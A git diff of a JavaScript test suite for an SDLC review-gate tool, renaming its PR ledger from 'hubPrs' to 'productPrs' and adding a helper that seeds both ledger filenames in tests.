@@ -81,6 +81,12 @@ async function captureConsole(fn) {
 // Import after env is irrelevant (reconcile is non-interactive).
 const { reconcile } = await import('./reconcile.mjs');
 
+// E122: the PR ledger as a test seeds it — under both names, the way the engine writes it. Seeding only the
+// old name beside a new one the engine already wrote is a drift, which every command refuses.
+const writePrLedger = (sdlcDir, body) => {
+  for (const f of ['product-prs.json', 'hub-prs.json']) fs.writeFileSync(path.join(sdlcDir, f), body);
+};
+
 test('check --fix installs module + wires repo, then is idempotent', async () => {
   const { T } = scaffold();
   const r1 = await reconcile(T, { fix: true });
@@ -2315,7 +2321,7 @@ test('preconditionsMet: current step runnable, downstream blocked, done step not
 });
 
 test('nextAction: author step → invoke the mapped skill', () => {
-  const a = nextAction({ state: chain({ currentStep: 'architecture', architecture: 'in_progress' }), hubPrs: [] }, { epic: 'EP-x' });
+  const a = nextAction({ state: chain({ currentStep: 'architecture', architecture: 'in_progress' }), productPrs: [] }, { epic: 'EP-x' });
   assert.equal(a.kind, 'author');
   assert.equal(a.skill, 'yad-architecture');
   assert.equal(a.artifact, 'architecture.md');
@@ -2323,10 +2329,10 @@ test('nextAction: author step → invoke the mapped skill', () => {
 
 test('nextAction: review step with no PR → open; with a PR → sync', () => {
   const state = chain({ currentStep: 'epic-review', epicReview: 'in_review', architecture: 'blocked' });
-  const open = nextAction({ state, hubPrs: [] }, { epic: 'EP-x' });
+  const open = nextAction({ state, productPrs: [] }, { epic: 'EP-x' });
   assert.equal(open.kind, 'review-open');
   assert.equal(open.command, 'yad gate open EP-x epic.md');
-  const sync = nextAction({ state, hubPrs: [{ artifact: 'epic.md', number: 7 }] }, { epic: 'EP-x' });
+  const sync = nextAction({ state, productPrs: [{ artifact: 'epic.md', number: 7 }] }, { epic: 'EP-x' });
   assert.equal(sync.kind, 'review-sync');
   assert.equal(sync.command, 'yad gate sync EP-x epic.md');
   assert.equal(sync.pr, 7);
@@ -2334,10 +2340,10 @@ test('nextAction: review step with no PR → open; with a PR → sync', () => {
 
 test('nextAction: ready-for-build → build; an open test-cases track is surfaced as parallel', () => {
   const base = { epicId: 'EP-x', currentStep: 'ready-for-build', steps: [S('stories-review', 'review+approve', 'done', 'stories/')] };
-  assert.equal(nextAction({ state: base, hubPrs: [] }).kind, 'build');
-  assert.equal(nextAction({ state: base, hubPrs: [] }).parallel, null);
+  assert.equal(nextAction({ state: base, productPrs: [] }).kind, 'build');
+  assert.equal(nextAction({ state: base, productPrs: [] }).parallel, null);
   const withTc = { ...base, steps: [...base.steps, S('test-cases', 'author', 'in_progress', 'test-cases.md')] };
-  const a = nextAction({ state: withTc, hubPrs: [] });
+  const a = nextAction({ state: withTc, productPrs: [] });
   assert.equal(a.kind, 'build');
   assert.equal(a.parallel.skill, 'yad-test-cases');
 });
@@ -2435,7 +2441,7 @@ test('buildNextActions: maps every story/repo, repos sorted', () => {
 test('nextAction: ready-for-build WITH build-state surfaces per-repo build sub-steps', () => {
   const state = { epicId: 'EP-x', currentStep: 'ready-for-build', steps: [S('stories-review', 'review+approve', 'done', 'stories/')] };
   const buildStates = [{ story: 'EP-x-S03', repos: { backend: repoBS('checks', ['spec', 'tasks', 'implement']) } }];
-  const a = nextAction({ state, hubPrs: [], buildStates });
+  const a = nextAction({ state, productPrs: [], buildStates });
   assert.equal(a.kind, 'build');
   assert.equal(a.builds.length, 1);
   assert.equal(a.builds[0].repos[0].skill, 'yad-checks');
@@ -2444,14 +2450,14 @@ test('nextAction: ready-for-build WITH build-state surfaces per-repo build sub-s
 
 test('nextAction: ready-for-build with NO build-state keeps the static start hint', () => {
   const state = { epicId: 'EP-x', currentStep: 'ready-for-build', steps: [S('stories-review', 'review+approve', 'done', 'stories/')] };
-  const a = nextAction({ state, hubPrs: [], buildStates: [] });
+  const a = nextAction({ state, productPrs: [], buildStates: [] });
   assert.equal(a.kind, 'build');
   assert.equal(a.builds, undefined);
   assert.match(a.why, /Shape approved/);
 });
 
 test('nextAction: no state → kind new (seed with yad-epic)', () => {
-  const a = nextAction({ state: null, hubPrs: [] }, { epic: 'EP-x' });
+  const a = nextAction({ state: null, productPrs: [] }, { epic: 'EP-x' });
   assert.equal(a.kind, 'new');
   assert.equal(a.skill, 'yad-epic');
 });
@@ -2466,24 +2472,24 @@ const dstate = (over) => ({
 });
 
 test('nextAction: discovery author step maps to yad-discovery', () => {
-  const a = nextAction({ state: dstate({ currentStep: 'discovery', discovery: 'in_progress', review: 'blocked' }), hubPrs: [] }, { epic: 'EP-discovery' });
+  const a = nextAction({ state: dstate({ currentStep: 'discovery', discovery: 'in_progress', review: 'blocked' }), productPrs: [] }, { epic: 'EP-discovery' });
   assert.equal(a.kind, 'author');
   assert.equal(a.skill, 'yad-discovery');
   assert.equal(a.artifact, 'discovery/');
 });
 
 test('nextAction: discovery in review → open the gate; with a PR → sync (no parallel track)', () => {
-  const open = nextAction({ state: dstate({ currentStep: 'discovery-review' }), hubPrs: [] }, { epic: 'EP-discovery' });
+  const open = nextAction({ state: dstate({ currentStep: 'discovery-review' }), productPrs: [] }, { epic: 'EP-discovery' });
   assert.equal(open.kind, 'review-open');
   assert.equal(open.command, 'yad gate open EP-discovery discovery/');
   assert.equal(open.parallel, undefined);
-  const sync = nextAction({ state: dstate({ currentStep: 'discovery-review' }), hubPrs: [{ artifact: 'discovery/', number: 3 }] }, { epic: 'EP-discovery' });
+  const sync = nextAction({ state: dstate({ currentStep: 'discovery-review' }), productPrs: [{ artifact: 'discovery/', number: 3 }] }, { epic: 'EP-discovery' });
   assert.equal(sync.kind, 'review-sync');
   assert.equal(sync.pr, 3);
 });
 
 test('nextAction: an approved discovery (discovery-done) points at yad-epic, not Build', () => {
-  const a = nextAction({ state: dstate({ currentStep: 'discovery-done', discovery: 'done', review: 'done' }), hubPrs: [] }, { epic: 'EP-discovery' });
+  const a = nextAction({ state: dstate({ currentStep: 'discovery-done', discovery: 'done', review: 'done' }), productPrs: [] }, { epic: 'EP-discovery' });
   assert.equal(a.kind, 'discovery-done');
   assert.match(a.why, /roadmap\.md/);
 });
@@ -3390,7 +3396,7 @@ function scaffoldEpic() {
   const reopened = JSON.stringify([
     { step: 'architecture-review', artifact: 'architecture.md', platform: 'github', number: 7, url: 'http://x/7', branch: 'review/EP-test/architecture', lastSyncedAt: null },
   ]);
-  fs.writeFileSync(path.join(ep, '.sdlc/hub-prs.json'), reopened);
+  writePrLedger(path.join(ep, '.sdlc'), reopened);
   fs.writeFileSync(path.join(ep, '.sdlc/product-prs.json'), reopened);
   return { T, ep };
 }
@@ -3555,7 +3561,7 @@ test('E62 upgrade: an older fingerprint FORM that is still live is not "stale" �
         { id: 'epic-review', type: 'review+approve', artifact: 'epic.md', status: 'in_review', risk_tags: [] },
       ] }));
       const ptr = JSON.stringify([{ step: 'epic-review', artifact: 'epic.md', platform: 'gitlab', number: 5, url: 'http://x/5', branch: 'review/EP-test/epic', lastSyncedAt: null }]);
-      fs.writeFileSync(path.join(ep, '.sdlc/hub-prs.json'), ptr);
+      writePrLedger(path.join(ep, '.sdlc'), ptr);
       fs.writeFileSync(path.join(ep, '.sdlc/product-prs.json'), ptr);
       const { acceptedHashes } = await import('./epic-state.mjs');
       const accepted = acceptedHashes(ep, 'epic.md');
@@ -4236,7 +4242,7 @@ test('gate sync: EP-discovery advances through the SAME gate to discovery-done (
       { id: 'discovery-review', type: 'review+approve', artifact: 'discovery/', status: 'in_review', risk_tags: [] },
     ],
   }));
-  fs.writeFileSync(path.join(ep, '.sdlc/hub-prs.json'), JSON.stringify([
+  writePrLedger(path.join(ep, '.sdlc'), JSON.stringify([
     { step: 'discovery-review', artifact: 'discovery/', platform: 'github', number: 4, url: 'http://x/4', branch: 'review/EP-discovery/discovery', lastSyncedAt: null },
   ]));
   const approval = { ok: true, state: 'MERGED', merged: true, headOid: 'abc',
@@ -4273,7 +4279,7 @@ test('gate sync: EP-foundation advances through the SAME gate at foundation/ to 
         { id: 'foundation-review', type: 'review+approve', artifact: 'foundation/', status: 'in_review', risk_tags: [] },
       ],
     }));
-    fs.writeFileSync(path.join(fd, '.sdlc/hub-prs.json'), JSON.stringify([
+    writePrLedger(path.join(fd, '.sdlc'), JSON.stringify([
       { step: 'foundation-review', artifact: 'foundation/', platform: 'github', number: 5, url: 'http://x/5', branch: 'review/EP-foundation/foundation', lastSyncedAt: null },
     ]));
     const approval = { ok: true, state: 'MERGED', merged: true, headOid: 'abc',
@@ -4434,7 +4440,7 @@ async function reopenAndReapprove(reviews) {
   assert.ok(stale.every((a) => a.artifactHash !== newHash), 'the re-lock revoked the prior approvals');
 
   // A NEW review MR/PR for the re-opened step, approved by the same reviewers, merged.
-  fs.writeFileSync(path.join(ep, '.sdlc/hub-prs.json'), JSON.stringify([
+  writePrLedger(path.join(ep, '.sdlc'), JSON.stringify([
     { step: 'architecture-review', artifact: 'architecture.md', platform: 'github', number: 11, url: 'http://x/11', branch: 'review/EP-test/architecture', lastSyncedAt: null },
   ]));
   await gateSync(T, { epic: 'EP-test', today: '2026-06-20', reader: () => first });
@@ -4505,7 +4511,7 @@ test('gate sync: re-syncing a done step is a byte-identical no-op, threads and a
   const snapshot = () => ({
     approvals: fs.readFileSync(path.join(ep, '.sdlc/approvals.json'), 'utf8'),
     comments: fs.readFileSync(path.join(ep, '.sdlc/comments.json'), 'utf8'),
-    hubPrs: fs.readFileSync(path.join(ep, '.sdlc/hub-prs.json'), 'utf8'),
+    productPrs: fs.readFileSync(path.join(ep, '.sdlc/hub-prs.json'), 'utf8'),
     reviews: fs.readdirSync(path.join(ep, 'reviews')).sort(),
   });
   // Baseline BEFORE any re-sync, so a write by the first re-sync cannot be baked into it.
@@ -4532,8 +4538,8 @@ test('gate sync: advances multiple passing gates in CHAIN order, never in ledger
     { id: 'epic-review', type: 'review+approve', artifact: 'epic.md', status: 'in_review', risk_tags: [] },
   );
   fs.writeFileSync(path.join(ep, '.sdlc/state.json'), JSON.stringify(state));
-  // Ledger order is alphabetical (what canonicalHubPrs writes) — the REVERSE of the chain here.
-  fs.writeFileSync(path.join(ep, '.sdlc/hub-prs.json'), JSON.stringify([
+  // Ledger order is alphabetical (what canonicalProductPrs writes) — the REVERSE of the chain here.
+  writePrLedger(path.join(ep, '.sdlc'), JSON.stringify([
     { step: 'architecture-review', artifact: 'architecture.md', platform: 'github', number: 7, url: null, branch: 'review/EP-test/architecture', lastSyncedAt: null },
     { step: 'epic-review', artifact: 'epic.md', platform: 'github', number: 8, url: null, branch: 'review/EP-test/epic', lastSyncedAt: null },
   ]));
@@ -4562,9 +4568,9 @@ test('gate sync: a two-step ledger is order-stable under a rotating re-sync (iss
     { id: 'epic-review', type: 'review+approve', artifact: 'epic.md', status: 'in_review', risk_tags: [] },
   );
   fs.writeFileSync(path.join(ep, '.sdlc/state.json'), JSON.stringify(state));
-  const hubPrs = JSON.parse(fs.readFileSync(path.join(ep, '.sdlc/hub-prs.json')));
-  hubPrs.push({ step: 'epic-review', artifact: 'epic.md', platform: 'github', number: 8, url: 'http://x/8', branch: 'review/EP-test/epic', lastSyncedAt: null });
-  fs.writeFileSync(path.join(ep, '.sdlc/hub-prs.json'), JSON.stringify(hubPrs));
+  const productPrs = JSON.parse(fs.readFileSync(path.join(ep, '.sdlc/hub-prs.json')));
+  productPrs.push({ step: 'epic-review', artifact: 'epic.md', platform: 'github', number: 8, url: 'http://x/8', branch: 'review/EP-test/epic', lastSyncedAt: null });
+  writePrLedger(path.join(ep, '.sdlc'), JSON.stringify(productPrs));
 
   const sync = (artifact, today) => gateSync(T, { epic: 'EP-test', artifact, today, reader: () => fullApproval });
   // Advance both gates, then let one full sweep settle the ledger.
@@ -4646,21 +4652,21 @@ test('gate sync: a done step never posts engagement nudges on its merged PR', as
 // through by hand has none — `gate sync` used to refuse it outright and the advance was unreachable.
 test('gate sync: resolves an unrecorded review PR from the review branch (issue #158)', async () => {
   const { T, ep } = scaffoldEpic();
-  fs.writeFileSync(path.join(ep, '.sdlc/hub-prs.json'), '[]'); // nothing recorded — the verified ledger case
+  writePrLedger(path.join(ep, '.sdlc'), '[]'); // nothing recorded — the verified ledger case
   const seen = [];
   const finder = (platform, branch) => { seen.push([platform, branch]); return { ok: true, number: 42, url: 'http://x/42' }; };
   await gateSync(T, { epic: 'EP-test', artifact: 'architecture.md', today: '2026-06-09', reader: () => fullApproval, finder });
   assert.deepEqual(seen, [['github', 'review/EP-test/architecture']], 'looked the PR up by its review branch');
   const state = JSON.parse(fs.readFileSync(path.join(ep, '.sdlc/state.json')));
   assert.equal(state.steps.find((s) => s.id === 'architecture-review').status, 'done', 'the merged review advances');
-  const hubPrs = JSON.parse(fs.readFileSync(path.join(ep, '.sdlc/hub-prs.json')));
-  assert.equal(hubPrs[0].number, 42, 'the resolved pointer is adopted on the writer path');
+  const productPrs = JSON.parse(fs.readFileSync(path.join(ep, '.sdlc/hub-prs.json')));
+  assert.equal(productPrs[0].number, 42, 'the resolved pointer is adopted on the writer path');
   fs.rmSync(T, { recursive: true, force: true });
 });
 
 test('gate sync: --pr names the review PR directly, without a branch lookup', async () => {
   const { T, ep } = scaffoldEpic();
-  fs.writeFileSync(path.join(ep, '.sdlc/hub-prs.json'), '[]');
+  writePrLedger(path.join(ep, '.sdlc'), '[]');
   const finder = () => { throw new Error('must not be called when --pr is given'); };
   const branchOf = () => ({ ok: true, branch: 'review/EP-test/architecture' });
   await gateSync(T, { epic: 'EP-test', artifact: 'architecture.md', today: '2026-06-09', number: '42', reader: () => fullApproval, finder, branchOf });
@@ -4706,7 +4712,7 @@ test('gate sync: --pr naming the recorded PR keeps its url and nudge history', a
 
 test('gate sync: --pr naming a PR on another branch is refused, not bound to this artifact', async () => {
   const { T, ep } = scaffoldEpic();
-  fs.writeFileSync(path.join(ep, '.sdlc/hub-prs.json'), '[]');
+  writePrLedger(path.join(ep, '.sdlc'), '[]');
   const out = [];
   const restore = console.log;
   console.log = (s = '') => out.push(String(s));
@@ -4742,7 +4748,7 @@ test('gate sync: a non-numeric --pr is rejected before it reaches the platform',
 
 test('gate sync: an unconfirmable --pr warns but is taken at the human\'s word', async () => {
   const { T, ep } = scaffoldEpic();
-  fs.writeFileSync(path.join(ep, '.sdlc/hub-prs.json'), '[]');
+  writePrLedger(path.join(ep, '.sdlc'), '[]');
   const out = [];
   const restore = console.log;
   console.log = (s = '') => out.push(String(s));
@@ -4761,7 +4767,7 @@ test('gate sync: an unconfirmable --pr warns but is taken at the human\'s word',
 
 test('gate sync: an unresolvable review PR reports the recovery, not a bare refusal', async () => {
   const { T, ep } = scaffoldEpic();
-  fs.writeFileSync(path.join(ep, '.sdlc/hub-prs.json'), '[]');
+  writePrLedger(path.join(ep, '.sdlc'), '[]');
   const out = [];
   const restore = console.log;
   console.log = (s = '') => out.push(String(s));
@@ -5073,7 +5079,7 @@ test('missing ledger files still default silently (a fresh epic is a normal stat
   const ledger = loadLedger(path.join(T, 'epics/EP-x'));
   assert.equal(ledger.state, null);
   assert.deepEqual(ledger.approvals, []);
-  assert.deepEqual(ledger.hubPrs, []);
+  assert.deepEqual(ledger.productPrs, []);
   fs.rmSync(T, { recursive: true, force: true });
 });
 
@@ -5985,7 +5991,7 @@ test('runCommit: the missing-Task warning is stage-aware (hub vs code repo)', as
 // `yad gate ci` — merge-driven sync (Path B): read-only pre-merge; advance + status flip on the
 // default branch at merge. Derives the epic/artifact from the review branch name.
 // ---------------------------------------------------------------------------------------------
-const { parseReviewBranch, artifactFromBase, artifactPaths, upsertHubPr, artifactBase, advanceState, markInReview, discoveryHash, DISCOVERY_FILES, skipStep, unskipStep, deferStep, undeferStep, unblockStep, optionalStepsOf, optionalStepsFor, isSkippableStep, authorStepFor, repairState, canonicalApprovals, canonicalComments, canonicalHubPrs, isPassed, isAuthored } = await import('./epic-state.mjs');
+const { parseReviewBranch, artifactFromBase, artifactPaths, upsertProductPr, artifactBase, advanceState, markInReview, discoveryHash, DISCOVERY_FILES, skipStep, unskipStep, deferStep, undeferStep, unblockStep, optionalStepsOf, optionalStepsFor, isSkippableStep, authorStepFor, repairState, canonicalApprovals, canonicalComments, canonicalProductPrs, isPassed, isAuthored } = await import('./epic-state.mjs');
 const { gateCi } = await import('./gate.mjs');
 
 // issue #163. Sorting is only a fix if the order is TOTAL: `Array#sort` is stable, so records that tie
@@ -6011,17 +6017,17 @@ test('canonicalApprovals/canonicalComments impose a TOTAL order (no ties keep in
   // first. Two machines disagreeing on that is the same churn, reintroduced.
   const by = (name) => ({ ...a, approver: name });
   assert.deepEqual(canonicalApprovals([by('alice'), by('Zoe')]).map((x) => x.approver), ['Zoe', 'alice']);
-  // canonicalHubPrs has the narrowest key of the three, so it leans hardest on the tiebreak.
+  // canonicalProductPrs has the narrowest key of the three, so it leans hardest on the tiebreak.
   const pr = (artifact, number) => ({ step: `${artifact.split('.')[0]}-review`, artifact, platform: 'github', number });
   const prs = [pr('epic.md', 8), pr('architecture.md', 7), pr('ui-design.md', 9)];
-  assert.deepEqual(canonicalHubPrs(prs).map((x) => x.artifact), ['architecture.md', 'epic.md', 'ui-design.md']);
-  assert.equal(key(canonicalHubPrs(prs)), key(canonicalHubPrs([...prs].reverse())));
+  assert.deepEqual(canonicalProductPrs(prs).map((x) => x.artifact), ['architecture.md', 'epic.md', 'ui-design.md']);
+  assert.equal(key(canonicalProductPrs(prs)), key(canonicalProductPrs([...prs].reverse())));
   // Same artifact+step, different payload: the key ties, so only the tiebreak keeps this deterministic.
   const dup = [{ ...prs[0], number: 2 }, { ...prs[0], number: 1 }];
-  assert.equal(key(canonicalHubPrs(dup)), key(canonicalHubPrs([...dup].reverse())));
+  assert.equal(key(canonicalProductPrs(dup)), key(canonicalProductPrs([...dup].reverse())));
   // Empty / absent input is the ledger's normal starting state.
   assert.deepEqual(canonicalApprovals(), []);
-  assert.deepEqual(canonicalHubPrs(), []);
+  assert.deepEqual(canonicalProductPrs(), []);
 });
 
 test('parseReviewBranch accepts review/EP-*/<base> and rejects everything else', () => {
@@ -6488,7 +6494,7 @@ test('the chain readers walk past every passed state and stop on a blocked one',
     { ok: false, blockedBy: 'epic-review', reason: 'epic-review has not passed yet' });
 
   // …and `yad next` refuses to name a skill for it, printing what the record says instead.
-  const act = nextAction({ state: stuck, hubPrs: [] }, { epic: 'EP-x' });
+  const act = nextAction({ state: stuck, productPrs: [] }, { epic: 'EP-x' });
   assert.equal(act.kind, 'blocked');
   assert.equal(act.step, 'epic-review');
   assert.equal(act.skill, undefined, 'a blocked step has no skill to invoke — the blocker is not in this tool');
@@ -6497,7 +6503,7 @@ test('the chain readers walk past every passed state and stop on a blocked one',
   // A blocked step with no record at shape 7 reads as `todo` — so `yad next` names the step, not a
   // blocker nobody described. That surprise is exactly what `yad doctor`'s `step:no-record` reports.
   const vague = chain(S('epic', 'done'), S('epic-review', 'blocked'), S('architecture', 'todo'));
-  assert.equal(nextAction({ state: vague, hubPrs: [] }, { epic: 'EP-x' }).kind, 'review-open');
+  assert.equal(nextAction({ state: vague, productPrs: [] }, { epic: 'EP-x' }).kind, 'review-open');
 
   // An unknown state fails closed: the chain stops, and the step before it is what `yad next` names.
   const weird = chain(S('epic', 'quantum'), S('epic-review', 'todo'));
@@ -6925,7 +6931,7 @@ test('undeferStep after later work finished re-opens the pair beside it, and the
   advanceState(state, byId(state, 'stories-review'));
   assert.equal(state.currentStep, 'ready-for-build');
   assert.equal(byId(state, 'ui-design').status, 'in_progress');
-  const a = nextAction({ state, hubPrs: [] });
+  const a = nextAction({ state, productPrs: [] });
   assert.equal(a.kind, 'build');
   assert.deepEqual(a.reopened.map((l) => [l.step, l.kind]), [['ui-design', 'author']]);
   assert.equal(a.debt, undefined, 'a plain deferral is no debt');
@@ -6934,7 +6940,7 @@ test('undeferStep after later work finished re-opens the pair beside it, and the
   markInReview(state, byId(state, 'ui-design-review'));
   assert.equal(state.currentStep, 'ready-for-build');
   assert.equal(byId(state, 'ui-design').status, 'done');
-  assert.deepEqual(nextAction({ state, hubPrs: [] }).reopened.map((l) => [l.step, l.kind, l.command]),
+  assert.deepEqual(nextAction({ state, productPrs: [] }).reopened.map((l) => [l.step, l.kind, l.command]),
     [['ui-design-review', 'review-open', 'yad gate open EP-x ui-design.md']]);
 
   // (4) It passes: nothing after it re-opens, and there is no lane left.
@@ -6942,7 +6948,7 @@ test('undeferStep after later work finished re-opens the pair beside it, and the
   assert.equal(byId(state, 'ui-design-review').status, 'done');
   assert.equal(byId(state, 'stories').status, 'done', 'the finished stories are not re-opened');
   assert.equal(state.currentStep, 'ready-for-build');
-  assert.equal(nextAction({ state, hubPrs: [] }).reopened, undefined);
+  assert.equal(nextAction({ state, productPrs: [] }).reopened, undefined);
   assert.deepEqual(stateInvariants(state), []);
 });
 
@@ -7000,7 +7006,7 @@ test('debt: `yad defer --debt` marks the pair owed, the reminder lasts until the
   assert.equal(stepStatus(byId(state, 'ui-design')), 'deferred', 'a flag beside the state, not a state');
   assert.equal(isPassed(byId(state, 'ui-design')), true);
   assert.deepEqual(owedSteps(state).map((s) => s.id), ['ui-design'], 'one debt per pair');
-  assert.deepEqual(nextAction({ state, hubPrs: [] }).debt,
+  assert.deepEqual(nextAction({ state, productPrs: [] }).debt,
     [{ step: 'ui-design', status: 'deferred', record: { reason: 'launch date', by: '@al', date: '2026-09-14' } }]);
 
   // A plain deferral carries no flag; `--debt` on it later adds one and keeps the record.
@@ -7027,7 +7033,7 @@ test('debt: `yad defer --debt` marks the pair owed, the reminder lasts until the
   assert.equal(byId(owed, 'ui-design').debt, undefined);
   assert.equal(byId(owed, 'ui-design-review').debt, undefined);
   assert.deepEqual(owedSteps(owed), []);
-  assert.equal(nextAction({ state: owed, hubPrs: [] }).debt, undefined);
+  assert.equal(nextAction({ state: owed, productPrs: [] }).debt, undefined);
 });
 
 test('E41 review: a debt cannot be skipped, a late re-open can be deferred again, the late path needs FINISHED work, and a gate walks past inherited steps', () => {
@@ -7075,7 +7081,7 @@ test('E41 review: a debt cannot be skipped, a late re-open can be deferred again
   assert.equal(change.currentStep, 'stories');
   assert.equal(byId(change, 'stories').status, 'in_progress');
   assert.equal(stepStatus(byId(change, 'architecture')), 'satisfied', 'an inherited step is not written over');
-  assert.equal(nextAction({ state: change, hubPrs: [] }).step, 'stories');
+  assert.equal(nextAction({ state: change, productPrs: [] }).step, 'stories');
 });
 
 test('the shared walk steps over a deferred pair when a skip, un-skip or un-defer moves currentStep (E37)', () => {
@@ -7121,13 +7127,13 @@ test('unblockStep clears a real blocker: the status and the record together, nev
   assert.equal(byId(a, 'architecture').status, 'in_progress');
   assert.equal(byId(a, 'architecture').record, undefined, 'the record goes with the wait it explained');
   assert.equal(a.currentStep, 'architecture', 'currentStep is not this verb\'s to move');
-  assert.equal(nextAction({ state: a, hubPrs: [] }).kind, 'author');
+  assert.equal(nextAction({ state: a, productPrs: [] }).kind, 'author');
 
   // A blocked review gate goes to `todo`: opening the review is `yad gate open`'s job.
   const g = unblockStep(chain('architecture-review', 'done', 'blocked'), 'architecture-review');
   assert.equal(byId(g, 'architecture-review').status, 'todo');
   assert.equal(byId(g, 'architecture-review').record, undefined);
-  assert.equal(nextAction({ state: g, hubPrs: [] }).kind, 'review-open');
+  assert.equal(nextAction({ state: g, productPrs: [] }).kind, 'review-open');
 
   // A blocker the chain has not reached yet stays `todo`: nobody can work on it until the steps before it pass.
   const early = { epicId: 'EP-x', currentStep: 'epic', steps: [S('epic', 'in_progress'), S('epic-review', 'todo'), S('architecture', 'blocked', { record: { ...rec } })] };
@@ -7152,7 +7158,7 @@ test('a gate passing does not open a blocked step after it — the blocker stays
   assert.equal(state.currentStep, 'ui-design', 'the chain still moves to the step');
   assert.equal(byId(state, 'ui-design').status, 'blocked', 'a gate passing is not somebody saying the wait is over');
   assert.deepEqual(byId(state, 'ui-design').record, rec);
-  assert.equal(nextAction({ state, hubPrs: [] }).kind, 'blocked', '`yad next` shows the blocker, not "author the UI"');
+  assert.equal(nextAction({ state, productPrs: [] }).kind, 'blocked', '`yad next` shows the blocker, not "author the UI"');
   unblockStep(state, 'ui-design');
   assert.equal(byId(state, 'ui-design').status, 'in_progress', 'and once cleared, the step is the one being worked on');
   // The older spelling — `blocked` with NO record — is `todo`, so the gate still opens it as before.
@@ -7358,7 +7364,7 @@ test('gate sync on a deferred step says its review is still owed — not "alread
     }));
     // A review PR opened BEFORE the step was deferred — the one way a deferred step still has one, since
     // `yad gate open` now refuses it.
-    fs.writeFileSync(path.join(ep, '.sdlc/hub-prs.json'), JSON.stringify([
+    writePrLedger(path.join(ep, '.sdlc'), JSON.stringify([
       { step: 'ui-design-review', artifact: 'ui-design.md', platform: 'github', number: 7, url: 'http://x/7', branch: 'review/EP-x/ui-design', lastSyncedAt: null },
     ]));
     const pr = { ok: true, state: 'OPEN', merged: false, headOid: 'abc', reviews: [], threads: [] };
@@ -7403,7 +7409,7 @@ test('a re-opened review goes through `yad gate open` and `yad gate sync` beside
     // A debt being paid back is no longer `deferred`, so `gate status` names it on the open review.
     assert.match(await grab(() => gateStatus(T, { epic: 'EP-x' })), /ui-design-review .*owed as debt — being paid back/);
 
-    fs.writeFileSync(path.join(ep, '.sdlc/hub-prs.json'), JSON.stringify([
+    writePrLedger(path.join(ep, '.sdlc'), JSON.stringify([
       { step: 'ui-design-review', artifact: 'ui-design.md', platform: 'github', number: 9, url: 'http://x/9', branch: 'review/EP-x/ui-design', lastSyncedAt: null },
     ]));
     const merged = { ok: true, state: 'merged', merged: true, headOid: 'a', threads: [], reviews: [
@@ -7472,7 +7478,7 @@ test('gate sync honours a skip only when the epic\'s route allows it', async () 
         { id: 'stories', type: 'author', artifact: 'stories/', status: 'blocked', risk_tags: [] },
       ],
     }));
-    fs.writeFileSync(path.join(ep, '.sdlc/hub-prs.json'), JSON.stringify([
+    writePrLedger(path.join(ep, '.sdlc'), JSON.stringify([
       { step: 'ui-design-review', artifact: 'ui-design.md', platform: 'github', number: 7, url: 'http://x/7', branch: 'review/EP-x/ui-design', lastSyncedAt: null },
     ]));
     return { T, ep };
@@ -8141,8 +8147,8 @@ test('closingRecord: `waived` rides only when it is given (E10)', async () => {
 test('gate sync: in solo mode a merged gate records waived: "solo" on the review step only, and gate status prints it (E10)', async () => {
   const { T, ep } = scaffoldEpic();
   try {
-    const hubFile = path.join(T, '.sdlc/hub.json');
-    fs.writeFileSync(hubFile, JSON.stringify({ ...JSON.parse(fs.readFileSync(hubFile, 'utf8')), solo: true }));
+    const productFile = path.join(T, '.sdlc/hub.json');
+    fs.writeFileSync(productFile, JSON.stringify({ ...JSON.parse(fs.readFileSync(productFile, 'utf8')), solo: true }));
     const stateFile = path.join(ep, '.sdlc/state.json');
     const s0 = JSON.parse(fs.readFileSync(stateFile));
     s0.steps.find((x) => x.id === 'architecture').status = 'in_progress';
@@ -8241,21 +8247,22 @@ test('yad mode writes both names and the record, names the open reviews, reads b
     assert.deepEqual(w.openReviews, [{ epic: 'EP-test', step: 'architecture-review' }]);
     assert.equal(w.openReviewsKnown, true);
 
+    // The name read since E122 is product.json, so that is the file a person edits.
     // The gates read the old flag, so a hand edit that leaves `mode` behind reads one way and acts another.
-    fs.writeFileSync(path.join(T, '.sdlc/hub.json'), JSON.stringify({ ...read('hub.json'), solo: true }));
+    fs.writeFileSync(path.join(T, '.sdlc/product.json'), JSON.stringify({ ...read('product.json'), solo: true }));
     r = await run(() => runMode(T, {}));
     assert.match(r.out, /mode: solo/);
     assert.match(r.out, /the file also says mode: "team", but the old `solo` flag is the one read/);
     r = await run(() => runMode(T, { to: 'solo' }));
     assert.equal(r.failed, false, 'correcting the name is not a switch, so no reason is asked');
     assert.match(r.out, /already solo — `mode` now matches `solo`/);
-    assert.equal(read('hub.json').mode, 'solo');
+    assert.equal(read('product.json').mode, 'solo');
 
-    fs.writeFileSync(path.join(T, '.sdlc/hub.json'), '{ nope');
+    fs.writeFileSync(path.join(T, '.sdlc/product.json'), '{ nope');
     r = await run(() => runMode(T, { to: 'team' }));
     assert.equal(r.failed, true);
     assert.match(r.out, /does not parse — nothing is written over it/);
-    assert.equal(fs.readFileSync(path.join(T, '.sdlc/hub.json'), 'utf8'), '{ nope');
+    assert.equal(fs.readFileSync(path.join(T, '.sdlc/product.json'), 'utf8'), '{ nope');
   } finally { fs.rmSync(T, { recursive: true, force: true }); }
 
   const empty = fs.mkdtempSync(path.join(os.tmpdir(), 'sdlc-e10-'));
@@ -8272,8 +8279,8 @@ test('yad mode on a verified Product says its open reviews are on the platform, 
   const { runMode } = await import('./mode.mjs');
   const { T } = scaffoldEpic();
   try {
-    const hubFile = path.join(T, '.sdlc/hub.json');
-    fs.writeFileSync(hubFile, JSON.stringify({ ...JSON.parse(fs.readFileSync(hubFile, 'utf8')), ledger: 'verified', bridge_enabled: true, bridge: true }));
+    const productFile = path.join(T, '.sdlc/hub.json');
+    fs.writeFileSync(productFile, JSON.stringify({ ...JSON.parse(fs.readFileSync(productFile, 'utf8')), ledger: 'verified', bridge_enabled: true, bridge: true }));
     let out = await grab(() => runMode(T, { to: 'solo', reason: 'on leave', today: '2026-09-15' }));
     assert.match(out, /open reviews live on the platform, not in state\.json — every open review PR\/MR follows the solo rule from its next CI run/);
     assert.doesNotMatch(out, /open review\(s\) follow/, 'the ledger list is not printed, since CI never marks a review open there');
@@ -8992,7 +8999,7 @@ test('a skipped lane is owed nothing: buildNextForRepo, the Build line, and feat
   const state = { epicId: 'EP-l', currentStep: 'ready-for-build', steps: [
     { id: 'epic', type: 'author', artifact: 'epic.md', status: 'done', risk_tags: [] },
     { id: 'epic-review', type: 'review+approve', artifact: 'epic.md', status: 'done', risk_tags: [] }] };
